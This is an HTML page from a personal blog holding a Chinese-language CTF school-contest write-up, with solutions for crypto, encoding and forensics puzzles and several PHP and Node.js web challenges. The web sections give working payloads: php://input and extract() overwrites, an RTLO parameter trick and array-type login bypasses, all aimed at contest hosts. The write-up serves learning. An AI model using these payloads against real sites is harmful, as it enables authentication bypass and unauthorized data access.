@@ -1,0 +1,540 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="feammer">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HelloCrypto在 task.py 发现从原文到密文的对应算法为 1234a &#x3D; [3,5,7,17,23]b &#x3D; [4,9,12,16,20,22]for i in range(len(data)):    result +&#x3D; chr(((ord(data[i]) - 97) * a[i % len(a)] + b[i % len(b)]) % 26 + 97)  编写对应的逆向算法 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF 校赛 WriteUp">
+<meta property="og:url" content="https://feammer.github.io/2022/04/03/CTF%E6%A0%A1%E8%B5%9BWriteUp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="HelloCrypto在 task.py 发现从原文到密文的对应算法为 1234a &#x3D; [3,5,7,17,23]b &#x3D; [4,9,12,16,20,22]for i in range(len(data)):    result +&#x3D; chr(((ord(data[i]) - 97) * a[i % len(a)] + b[i % len(b)]) % 26 + 97)  编写对应的逆向算法 12">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-04-15T07:25:22.312Z">
+<meta property="article:author" content="feammer">
+<meta property="article:tag" content="web, php, misc, crypto, aes, paillier">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>CTF 校赛 WriteUp - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"feammer.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>feammer 的小屋</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CTF 校赛 WriteUp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-04-03 00:00" pubdate>
+        2022年4月3日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      48 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CTF 校赛 WriteUp</h1>
+            
+            <div class="markdown-body">
+              <h2 id="HelloCrypto"><a href="#HelloCrypto" class="headerlink" title="HelloCrypto"></a>HelloCrypto</h2><p>在 task.py 发现从原文到密文的对应算法为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">17</span>,<span class="hljs-number">23</span>]<br>b = [<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    result += <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(data[i]) - <span class="hljs-number">97</span>) * a[i % <span class="hljs-built_in">len</span>(a)] + b[i % <span class="hljs-built_in">len</span>(b)]) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>)<br></code></pre></td></tr></table></figure>
+
+<p>编写对应的逆向算法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime <span class="hljs-keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse<br>dic = string.ascii_lowercase<br>a = [<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">17</span>,<span class="hljs-number">23</span>]<br>b = [<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>]<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./result.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(result)):<br>    m=<span class="hljs-built_in">ord</span>(result[i])-<span class="hljs-number">97</span><br>    x=inverse(a[i%<span class="hljs-number">5</span>],<span class="hljs-number">26</span>)<br>    x=x*(m-b[i%<span class="hljs-number">6</span>])<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>):<br>        x=x+((-<span class="hljs-number">1</span>) * x // <span class="hljs-number">26</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">26</span><br>    x=x%<span class="hljs-number">26</span><br>    x+=<span class="hljs-number">97</span><br>    data+=<span class="hljs-built_in">chr</span>(x)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./data.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(data.encode())<br></code></pre></td></tr></table></figure>
+
+<p>在 data.txt 文件末尾找到 flag</p>
+<h2 id="HelloPaillier"><a href="#HelloPaillier" class="headerlink" title="HelloPaillier"></a>HelloPaillier</h2><p>使用 yafu 分解 n 为 p*q ，带入 Paillier 算法进行解密，对得到的数据作转换成字符得到 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用 yafu 解得</span><br>p=<span class="hljs-number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span><br>q=<span class="hljs-number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span><br><br>g = n+<span class="hljs-number">1</span><br>lmda = lcm(p-<span class="hljs-number">1</span>,q-<span class="hljs-number">1</span>)<br>v1 = <span class="hljs-built_in">pow</span>(c,lmda,n**<span class="hljs-number">2</span>)<br>v2 = <span class="hljs-built_in">pow</span>(g,lmda,n**<span class="hljs-number">2</span>)<br>v1 = (v1-<span class="hljs-number">1</span>)//n<br>v2 = (v2-<span class="hljs-number">1</span>)//n<br>v2 = invert(v2,n)<br>flag_data = (v1*v2)%n<br>true_flag = long_to_bytes(flag_data)<br></code></pre></td></tr></table></figure>
+
+<h2 id="真正的CTF选手"><a href="#真正的CTF选手" class="headerlink" title="真正的CTF选手"></a>真正的CTF选手</h2><p>打开 txt 文件得 flag</p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>文件名 <code>bear.txt</code> 提示网站与熊论道<br>进入 <code>http://hi.pcmoe.net/</code> 输入文件内容得到 flag</p>
+<h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><ol>
+<li>对字符串摩斯解码，发现 <code>%u</code> 格式，得到 UTF-8 编码字符串</li>
+<li>偏移每个 UTF-8 字符 <code>%u25xx</code> 到 <code>%u00xx</code></li>
+<li>UTF-8 字符串解码，发现 \u 格式，得到 Unicode 编码字符串</li>
+<li>Unicode 编码字符串解码得到 base64 编码字符串</li>
+<li>base64 解码得到 flag</li>
+</ol>
+<h2 id="EasyWAV"><a href="#EasyWAV" class="headerlink" title="EasyWAV"></a>EasyWAV</h2><p>以波形图方式查看 wav 文件，发现文件尾端波形呈现出方波特征，考虑是追加了数据</p>
+<p>![image-20220404074822410](C:\Users\Zero feammer\AppData\Roaming\Typora\typora-user-images\image-20220404074822410.png)</p>
+<p>截取该部分以 hex 形式查看文件内容，发现 flag</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">00<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span>08<span class="hljs-number"> 09 </span>0A 0B 0C 0D 0E 0F  Decode Text<br><br>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span> ffffffffffffffff<br>......<br>6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C  llllllllllllllll<br>......<br>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span> aaaaaaaaaaaaaaaa<br>......<br>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span> gggggggggggggggg<br>......<br></code></pre></td></tr></table></figure>
+
+<h2 id="Simplest-php"><a href="#Simplest-php" class="headerlink" title="Simplest_php"></a>Simplest_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ceshi</span>)) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ceshi</span> == <span class="hljs-variable">$content</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$true_flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;try harder&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;try&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先 <code>isset($a) &amp;&amp; (file_get_contents($a, &#39;r&#39;)) === &#39;I want flag&#39;</code> 处需要绕过 <code>file_get_contents()</code></p>
+<p><code>file_get_contents($fileName)</code> 会把 <code>$fileName</code> 文件的内容读入一个字符串</p>
+<p>考虑使用 <code>php://input</code> 绕过，用 POST 方法传入要 GET 的参数 <code>$a</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/?a=php:/</span><span class="hljs-regexp">/input HTTP/</span><span class="hljs-number">1.1</span><br>...<br>I want flag<br></code></pre></td></tr></table></figure>
+
+<p>在 <code>$content = trim(file_get_contents($flag))</code> 中利用 <code>trim()</code> 会去除字符串首尾的空白字符，传入空白的 <code>$ceshi</code> 和 <code>$flag</code> 使得 <code>$content</code> 为空，绕过 <code>$ceshi == $content</code></p>
+<p>Payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /?ceshi=&amp;flag=&amp;a=php://input HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">121.40.176.232:8001</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">95</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4638</span>.<span class="hljs-number">54</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">11</span><br><br><span class="hljs-attribute">I</span> want flag<br></code></pre></td></tr></table></figure>
+
+<p>返回得到 flag{Php_1s_tHe_B3st_L@ngua9e_In_Th3_w0rld}</p>
+<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[username] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello admin&quot;</span>;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$_GET</span>[password] == <span class="hljs-string">&quot;61dctf&quot;</span>) &#123;  <span class="hljs-comment">//Welcome to61dCTF</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先正常传入 username ，在 <code>$_GET[password] ==&quot;61dctf&quot;</code> 语句处发现有从右向左书写的文字 ，选择直接在页面上 ctrl+CV变量名和值</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">121.40</span>.<span class="hljs-number">176.232</span>:<span class="hljs-number">8002</span>/?username<span class="hljs-operator">=</span>admin&amp;<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6CTF</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6password</span><span class="hljs-operator">=</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A661d</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A661dctf</span><br></code></pre></td></tr></table></figure>
+
+<p>得到 flag{We1c0me_TO_61d!!!}</p>
+<h2 id="simple-answer"><a href="#simple-answer" class="headerlink" title="simple answer"></a>simple answer</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$my_var</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hack&#x27;</span>];<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">flag</span>) &#123;<br>        <span class="hljs-title">echo</span> $<span class="hljs-title">flag</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$flag</span>.=<span class="hljs-variable">$my_var</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>set_error_handler()</code> 函数设置用户定义的错误处理函数，使用 <code>hack[]=</code> 制造传入错误，得到 flag{php_api_c0nvert_function_has_bug_81705}</p>
+<h2 id="easy-nodejs"><a href="#easy-nodejs" class="headerlink" title="easy_nodejs"></a>easy_nodejs</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> salt = <span class="hljs-string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span> <span class="hljs-comment">// hash 盐</span><br><span class="hljs-keyword">const</span> adminHash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>) + <span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>))).<span class="hljs-title function_">toString</span>()<br><span class="hljs-comment">// some code</span><br>	<span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>		<span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span> &amp;&amp; req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>) &#123;<br>			<span class="hljs-comment">//some code</span><br>			<span class="hljs-keyword">if</span>(!username || !password || username === password || username.<span class="hljs-property">length</span> === password.<span class="hljs-property">length</span> || username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>				<span class="hljs-comment">// some code, fail case</span><br>			&#125;<br>			<span class="hljs-keyword">const</span> hash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + username) + <span class="hljs-title function_">sha256</span>(salt + password))).<span class="hljs-title function_">toString</span>();<br>			<span class="hljs-keyword">if</span> (hash === adminHash) &#123;<br>				<span class="hljs-comment">//some code, success case</span><br>			&#125;<br>			<span class="hljs-keyword">else</span> &#123;<br>				<span class="hljs-comment">// some code, fail case</span><br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">// some code, fail case</span><br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看 index.js ，发现要登录才能返回 flag ，条件是 <code>hash === adminHash</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> adminHash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>) + <span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>))).<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">const</span> hash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + username) + <span class="hljs-title function_">sha256</span>(salt + password))).<span class="hljs-title function_">toString</span>();<br></code></pre></td></tr></table></figure>
+
+<p>构造 POST 请求传入 <code>username=admin&amp;password=admin</code> ，发现被 <code>username === &#39;admin&#39;</code> 阻断</p>
+<p>再看 <code>sha256(salt + username)</code> ，利用数组拼接和强类型比较的漏洞，传入 <code>username[]=admin&amp;password=admin</code> ，绕过 <code>username === &#39;admin&#39;</code> 和 <code>username === &#39;admin&#39;</code></p>
+<p>Payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.40.176.232:10001<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://121.40.176.232:10001<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows 